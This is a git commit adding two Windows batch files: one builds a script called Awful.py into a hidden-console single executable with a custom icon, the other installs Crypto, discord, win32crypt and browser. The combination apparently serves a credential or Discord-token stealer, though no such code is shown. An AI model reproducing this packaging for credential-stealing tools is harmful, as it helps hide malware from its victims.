8ceb3eee3d2d21f329f48e4194ee530fbbf9acb2
Nexuss <124531805+NexussEu@users.noreply.github.com>
2023-04-21 00:14:33 +0200

    Add files via upload

---
+++ BUILD.bat
@@ -0,0 +1,1 @@
+pyinstaller --onefile --noconsole --icon "Assets\gengarrage.ico" Awful.py
---
+++ install.bat
@@ -0,0 +1,5 @@
+pip install Crypto
+pip install discord
+pip install win32crypt
+pip install browser
+pause
